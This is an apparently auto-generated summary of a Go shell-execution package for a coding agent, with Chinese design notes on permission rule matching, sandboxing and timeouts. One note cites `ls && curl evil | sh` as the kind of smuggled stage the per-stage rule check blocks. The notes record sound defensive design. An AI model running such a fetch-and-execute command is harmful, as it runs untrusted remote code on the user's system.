---
package: shell
import_path: internal/tools/shell
layer: tools
generated_at: 2026-11-25T16:45:14Z
source_files: [bash.go, doc.go, matcher.go, run.go, security.go]
---

# internal/tools/shell

> Layer: **Tools** · Files: 5 · Interfaces: 0 · Structs: 4 · Functions: 3

## Structs

- **BashInput** — 3 fields: Command, Timeout, DangerouslyDisableSandbox
- **BashOutput** — 4 fields: Stdout, Stderr, ExitCode, TimedOut
- **RunResult** — 5 fields: Stdout, Stderr, ExitCode, TimedOut, Canceled
- **SecurityFinding** — 3 fields: Pattern, Segment, Reason

## Functions

- `AnalyzeCommand(command string) []SecurityFinding`
- `MatchCommandRule(pattern string, command string) bool`
- `Run(ctx context.Context, dir string, command string, timeout time.Duration) (RunResult, error)`

## Constants

- `DefaultBashTimeoutMs`
- `MaxBashTimeoutMs`

## Change Impact

**Exported type references (files that use types from this package):**
- `RunResult` → `internal/tui/bashmode.go`, `internal/tui/bashmode_test.go` (test)

## Dependencies

**Imports:** `internal/textutil`, `internal/tools`

**Imported by:** `internal/bootstrap`, `internal/tui`

<!-- AUTO-GENERATED ABOVE — DO NOT EDIT -->
<!-- MANUAL NOTES BELOW — preserved across regeneration -->

## Design Notes

- **复合/管道命令的每个 stage 都必须命中规则**（T-064）：`git status | grep staged` 在规则 `git *` 下不匹配 —— grep stage 不被规则覆盖。原因：规则表达的是"用户信任这一类命令"，信任必须覆盖命令行的全部副作用单位；只要有一个 stage 逃逸，恶意内容就可以借道被允许的 stage 执行（`ls && curl evil | sh` 不能因 `ls` 被允许而放行）。stage 划分复用 security.go 的 splitCompoundCommand/splitPipeline，与沙箱分析的切分口径一致。
- **glob 的 `*` 匹配含空格的任意字符**：`git *` 用 regexp QuoteMeta + `\*`→`.*` 实现，因此匹配 `git push origin main`。若用 shell glob 语义（`*` 不跨空格），`git *` 只能匹配单参数命令，与用户对 settings 规则的直觉（"所有 git 命令"）相悖。
- **`:*` 前缀语义 = 前缀后必须是词边界**：`go test:*` 匹配 `go test ./...` 但不匹配 `go tests`（前缀 + " " 或完全相等）。防止用前缀重叠伪造命令名绕过规则。
- **无效输入返回 (nil, nil) 而非 error**：PreparePermissionMatcher 失败时 checker 回退到纯工具名匹配（matchPattern 对无 matcher 的 content 规则返回 false），拒绝放行而非崩溃 —— 权限匹配失败必须保守。
- **2026-11-18 Bash cmd.Dir（feat/agent-cwd）**：Call 設 cmd.Dir = uctx.WorkingDir（非空時），委派 agent 與 worktree 會話的命令在正確目錄執行；空值維持繼承 process CWD。守護測試 bash_cwd_test.go×2。
- **2026-11-20 `Run` 共用執行（feat/bash-mode）**：`bash -c` 執行、逾時、取消判定抽成 `Run`，Bash 工具與 TUI 的 `!` 模式共用同一份。權限檢查留在工具層（`CheckPermissions`），`Run` 本身不做任何檢查，因為 `!` 是使用者親手打的指令、刻意不走權限鏈。父 ctx 被取消回報 `Canceled`，自己的逾時回報 `TimedOut`，兩者分開讓 TUI 能區分「Esc 取消」與「跑太久」。`WaitDelay=500ms` 防止被殺的指令有背景子程序佔住輸出 pipe 時 `Run` 卡住；`server &` 這類指令 bash 已正常結束但子程序仍佔 pipe，Go 回 `exec.ErrWaitDelay`，此時改用 `ProcessState.ExitCode()` 當正常結束（否則 Bash 工具會把背景啟動誤報成 exit -1）。守護測試 run_test.go×6。
